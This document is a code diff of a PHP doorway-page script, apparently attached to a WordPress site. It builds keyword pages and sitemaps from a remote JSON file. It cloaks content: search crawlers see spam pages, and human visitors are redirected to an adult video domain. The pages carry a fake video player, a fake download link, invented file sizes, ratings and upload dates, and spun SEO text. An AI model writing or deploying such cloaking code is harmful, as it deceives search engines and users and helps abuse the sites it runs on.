@@ -1,20 +1,23 @@
 <?php
-// --- [PERBAIKAN ROUTING] ---
-$base_path = str_replace('\\', '/', dirname($_SERVER['SCRIPT_NAME']));
-$base_path = ($base_path == '/' || $base_path == '.') ? '' : $base_path;
-$request_uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-$request_path = $base_path ? substr($request_uri, strlen($base_path)) : $request_uri;
+// --- [PERBAIKAN TOTAL ROUTING LARAVEL] ---
+// Kita hanya perlu mengambil URI dan membersihkannya.
+// Tidak perlu logika $base_path yang rumit.
+$request_path = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
 $request_path = trim($request_path, '/');
 // --- AKHIR PERBAIKAN ROUTING ---
 
 
-// [REQUEST 1] URL JSON BARU
-$content_url = 'https://player.javpornsub.net/content/testdulujson.json';
+// --- [PERUBAHAN LOGIKA JSON] ---
+if (!isset($wp_json_path) || empty($wp_json_path)) {
+    return; 
+}
+// --- [AKHIR PERUBAHAN LOGIKA JSON] ---
+
 
 // --- $video_pool Dihapus ---
 
 // Fungsi fetchFromUrl (Tanpa Cache, Sesuai permintaan Anda)
-function fetchFromUrl($url, $default = []) {
+function fetchFromUrl($url, $default = []) { 
     $content = false;
     if (ini_get('allow_url_fopen')) {
         $content = @file_get_contents($url);
@@ -52,14 +55,13 @@ function spin(string $text): string {
 }
 // --- AKHIR FUNGSI ---
 
-// --- [PERMINTAAN 2] BLOK GENERATOR ROBOTS.TXT ---
+// --- BLOK GENERATOR ROBOTS.TXT ---
 if ($request_path === 'robots' || $request_path === 'robots.txt') {
     $robots_file = 'robots.txt';
     $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
     $domain = $_SERVER['HTTP_HOST'];
     $base_url = $protocol . $domain . $base_path; 
     
-    // [PERMINTAAN 3] Menggunakan nama sitemap.xml
     $sitemap_url = $base_url . '/sitemap.xml';
     
     $robots_content = "User-agent: *\nAllow: /\n\nSitemap: " . $sitemap_url;
@@ -74,49 +76,87 @@ if ($request_path === 'robots' || $request_path === 'robots.txt') {
 // --- AKHIR BLOK ROBOTS.TXT ---
 
 
-// [REQUEST 2] BLOK GENERATOR SITEMAP
-if ($request_path === 'sitemap' || $request_path === 'sitemap.xml') {
-    // [PERMINTAAN 3] Nama file diubah ke sitemap.xml
-    $sitemap_file = 'sitemap.xml'; 
-
-    $content_data = fetchFromUrl($content_url, []);
-    $keywords = $content_data ? array_keys($content_data) : ['homepage-default'];
-
+// --- [PERBAIKAN TOTAL SITEMAP (SESUAI PERMINTAAN ANDA)] ---
+// Hanya merespons ke "/sitemap". TIDAK akan merespons /sitemap.xml, /sitemap-1.xml, dll.
+if ($request_path === 'sitemap') {
+    
+    @set_time_limit(300); // Beri waktu 5 menit untuk proses ini
+    
+    $content_data = fetchFromUrl($wp_json_path, []);
+    $keywords = $content_data ? array_keys($content_data) : [];
+    $total_keywords = count($keywords);
+    
     $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
     $domain = $_SERVER['HTTP_HOST'];
     $base_url = $protocol . $domain . $base_path; 
-
-    date_default_timezone_set('Asia/Jakarta');
     $now = date('Y-m-d\TH:i:s+07:00'); 
-
-    $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
-    $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
+    $urls_per_map = 50000; // 40k URL per file
     
-    foreach ($keywords as $keyword) {
-        $url = $base_url . '/' . htmlspecialchars(urlencode($keyword));
-        $xml .= '  <url>' . PHP_EOL;
-        $xml .= '    <loc>' . $url . '</loc>' . PHP_EOL;
-        $xml .= '    <lastmod>' . $now . '</lastmod>' . PHP_EOL;
-        $xml .= '  </url>' . PHP_EOL;
+    $num_maps = ceil($total_keywords / $urls_per_map);
+    if ($num_maps == 0) $num_maps = 1;
+    
+    $files_created = [];
+    $server_path = dirname($_SERVER['SCRIPT_FILENAME']);
+
+    // 1. BUAT SEMUA SUB-SITEMAP (Anak)
+    for ($i = 1; $i <= $num_maps; $i++) {
+        $sitemap_file = 'sitemap-' . $i . '.xml';
+        $sitemap_path = $server_path . '/' . $sitemap_file;
+        
+        $offset = ($i - 1) * $urls_per_map;
+        $keywords_chunk = array_slice($keywords, $offset, $urls_per_map);
+
+        $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
+        $xml .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
+
+        foreach ($keywords_chunk as $keyword) {
+            $url = $base_url . '/' . htmlspecialchars(urlencode($keyword));
+            $xml .= '  <url>' . PHP_EOL;
+            $xml .= '    <loc>' . $url . '</loc>' . PHP_EOL;
+            $xml .= '    <lastmod>' . $now . '</lastmod>' . PHP_EOL;
+            $xml .= '  </url>' . PHP_EOL;
+        }
+        $xml .= '</urlset>' . PHP_EOL;
+        
+        file_put_contents($sitemap_path, $xml);
+        $files_created[] = $sitemap_file;
     }
 
-    $xml .= '</urlset>' . PHP_EOL;
+    // 2. BUAT SITEMAP INDEX (Induk)
+    $sitemap_file = 'sitemap.xml';
+    $sitemap_path = $server_path . '/' . $sitemap_file;
 
-    file_put_contents(dirname($_SERVER['SCRIPT_FILENAME']) . '/' . $sitemap_file, $xml);
+    $xml = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
+    $xml .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
+    for ($i = 1; $i <= $num_maps; $i++) {
+        $map_url = $base_url . '/sitemap-' . $i . '.xml';
+        $xml .= '  <sitemap>' . PHP_EOL;
+        $xml .= '    <loc>' . htmlspecialchars($map_url) . '</loc>' . PHP_EOL;
+        $xml .= '    <lastmod>' . $now . '</lastmod>' . PHP_EOL;
+        $xml .= '  </sitemap>' . PHP_EOL;
+    }
+    $xml .= '</sitemapindex>' . PHP_EOL;
+    
+    file_put_contents($sitemap_path, $xml);
+    $files_created[] = $sitemap_file;
+    
+    // 3. Tampilkan laporan sukses
     header('Content-Type: text/plain');
-    echo "Sitemap generated successfully at $sitemap_file\n";
-    echo "Total URLs: " . (count($keywords)) . "\n";
-    echo "Generated at: $now (WIB, Asia/Jakarta)\n";
+    echo "PROSES GENERATE SITEMAP SELESAI.\n\n";
+    echo "Total " . count($files_created) . " file telah dibuat/diperbarui:\n";
+    foreach ($files_created as $file) {
+        echo "- " . $file . "\n";
+    }
+        
     exit; 
 }
 // --- AKHIR BLOK SITEMAP ---
 
 
-// --- [PERMINTAAN 1] FITUR PREVIEW BARU ---
-$is_preview_mode = isset($_GET['p']); // Cek apakah ?p ada
-// --- AKHIR PERMINTAAN 1 ---
+// --- FITUR PREVIEW ---
+$is_preview_mode = isset($_GET['p']); 
 
-// --- TENTUKAN USER AGENT (Dipindahkan ke atas) ---
+// --- TENTUKAN USER AGENT ---
 $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $is_googlebot = preg_match('/google/i', $user_agent);
 
@@ -124,7 +164,7 @@ $is_googlebot = preg_match('/google/i', $user_agent);
 // MENGAMBIL SLUG DARI URL
 $input = $request_path; 
 
-$content_data = fetchFromUrl($content_url, [
+$content_data = fetchFromUrl($wp_json_path, [ 
     'default-keyword' => 'Default description if JSON fails'
 ]);
 $all_keywords = array_keys($content_data);
@@ -133,33 +173,40 @@ $all_keywords = array_keys($content_data);
 $found = ($input !== '' && array_key_exists($input, $content_data));
 $is_homepage = ($input === '');
 
-// --- [PERBAIKAN] LOGIKA REDIRECT ---
+// --- LOGIKA REDIRECT ---
 if (!$is_googlebot && !$is_preview_mode && $found) {
     header('Location: https://javpornsub.net'); 
     exit;
 }
 
-// --- [PERBAIKAN KRITIS UNTUK WORDPRESS] ---
+// --- LOGIKA KONTEN WORDPRESS ---
 if ($is_homepage) {
     return; 
 }
-
 if (!$found) {
-    // Biarkan WordPress menangani 404
     return; 
 }
 // --- HANYA HALAMAN SLUG YANG VALID YANG LOLOS ---
 
+// --- LOGIKA JUDUL (WANZ-895) ---
+$title_slug_base = htmlspecialchars(str_replace('-', ' ', $input));
+$title_slug = preg_replace_callback(
+    '/^([a-zA-Z]+[- ]\d+)/', 
+    function($m) { 
+        return strtoupper(str_replace(' ', '-', $m[1])); 
+    }, 
+    ucwords($title_slug_base) 
+);
+// --- AKHIR LOGIKA JUDUL ---
 
-$title_slug = htmlspecialchars(str_replace('-', ' ', $input));
 $additional_content = htmlspecialchars($content_data[$input]);
 
 // PERBAIKAN URL KANONIKAL
 $canonical = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 $canonical_url_only = 'https://' . $_SERVER['HTTP_HOST'] . rtrim(parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH), '/');
 
-// --- [PERBAIKAN] DATA UNIK OTOMATIS (TANPA POOL) ---
-$thumbnail = 'https://placehold.co/1280x720/1a1a1a/e0e0e0/?text=' . urlencode(ucwords($title_slug)) . '&font=lato';
+// --- DATA UNIK OTOMATIS (TANPA POOL) ---
+$thumbnail = 'https://placehold.co/1280x720/1a1a1a/e0e0e0/?text=' . urlencode($title_slug) . '&font=lato';
 $download_link = $canonical_url_only . '?download=1&file=' . $input;
 $file_size = spin('{850 MB|1.2 GB|1.5 GB|920 MB|1.1 GB}');
 $file_quality = spin('{1080p HD|720p HD|Full HD 1080p}');
@@ -167,18 +214,15 @@ $file_quality = spin('{1080p HD|720p HD|Full HD 1080p}');
 
 
 // Variabel dinamis untuk template
-$upload_date = date('Y-m-d', time() - rand(86400, 86400 * 30)); 
+$upload_date = date('c', time() - rand(86400, 86400 * 30)); 
 $video_id_prefix = 'JAV-' . rand(1000, 9999);
 $actress_name = 'Subbed-' . rand(100, 999);
 $rating_value = number_format(rand(48, 50) / 10, 1); 
 $rating_count = rand(2500, 15000); 
 
-// --- AMP Dihapus ---
-
 // --- [PENYESUAIAN SEO] ---
-// Judul SEO sekarang menggunakan Spintax untuk kata kunci target Anda
-$seo_title = ucwords($title_slug) . ' | ' . spin('{JAV Subtitle English|JAV Sub Eng|JAV Subbed}');
-$seo_description = $additional_content;
+$seo_title = $title_slug . ' | ' . spin('{JAV Subtitle English|JAV Sub Eng|JAV Subbed}');
+$seo_description = $title_slug . ' - ' . $additional_content;
 
 ?>
 <!doctype html>
@@ -317,10 +361,10 @@ $seo_description = $additional_content;
 
     <div class="container">
         <main>
-            <h1>Watch or Download: <?php echo ucwords($title_slug); ?></h1>
+            <h1>Watch or Download: <?php echo $title_slug; ?></h1> 
             
-            <a href="<?php echo $download_link; ?>" class="fake-player" title="Stream or Download <?php echo ucwords($title_slug); ?>">
-                <img src="<?php echo $thumbnail; ?>" alt="Play <?php echo ucwords($title_slug); ?>">
+            <a href="<?php echo $download_link; ?>" class="fake-player" title="Stream or Download <?php echo $title_slug; ?>">
+                <img src="<?php echo $thumbnail; ?>" alt="Play <?php echo $title_slug; ?>">
                 <div class="play-button">&#9658;</div>
             </a>
 
@@ -329,7 +373,7 @@ $seo_description = $additional_content;
                     <a href="<?php echo $download_link; ?>" class="btn">Download Full Video (<?php echo $file_size; ?>)</a>
                 </div>
 
-                <h2>File Information: <?php echo ucwords($title_slug); ?></h2>
+                <h2>File Information: <?php echo $title_slug; ?></h2>
                 
                 <ul class="file-meta">
                     <li><strong>File Name:</strong> <?php echo htmlspecialchars($input); ?>.mp4</li>
@@ -343,13 +387,14 @@ $seo_description = $additional_content;
                 </ul>
 
                 <h2>Synopsis:</h2>
-                <p><strong><?php echo $additional_content; ?></strong></p>
+                
+                <p><strong><?php echo $title_slug; ?></strong> - <?php echo $additional_content; ?></p>
                 
                 <p><?php echo spin(
                     "This {file|video} is part of our {exclusive|massive|premium} collection of <strong>JAV Sub English</strong> content. We {specialize|focus} in providing {high-quality|top-tier}, accurately translated <strong>JAV subbed</strong> videos for free streaming and download. Our {platform|site} is the {#1|best|top} source for {finding|discovering} {new|fresh} releases with English subtitles."
                 ); ?></p>
                 <p><?php echo spin(
-                    "{Stream or download|Get} your <?php echo ucwords($title_slug); ?> video and {hundreds|thousands} more, {updated daily|refreshed daily}. Our platform is {dedicated|built} for fans of Date: <strong>JAV Sub Eng</strong> content, ensuring a {fast|reliable|easy} experience in {HD|1080p|Full HD}."
+                    "{Stream or download|Get} your <?php echo $title_slug; ?> video and {hundreds|thousands} more, {updated daily|refreshed daily}. Our platform is {dedicated|built} for fans of <strong>JAV Sub Eng</strong> content, ensuring a {fast|reliable|easy} experience in {HD|1080p|Full HD}."
                 ); ?></p>
             </article>
 
@@ -363,7 +408,13 @@ $seo_description = $additional_content;
                         foreach ($random_keys as $key) {
                             $slug = htmlspecialchars($all_keywords[$key]);
                             if ($slug != $input) {
-                                $link_title = ucwords(str_replace('-', ' ', $slug));
+                                // [PERMINTAAN 1] Terapkan juga logika format judul di sini
+                                $link_title_base = htmlspecialchars(str_replace('-', ' ', $slug));
+                                $link_title = preg_replace_callback(
+                                    '/^([a-zA-Z]+[- ]\d+)/', 
+                                    function($m) { return strtoupper(str_replace(' ', '-', $m[1])); }, 
+                                    ucwords($link_title_base)
+                                );
                                 echo "<li><a href='/{$slug}'>{$link_title}</a></li>";
                             }
                         }
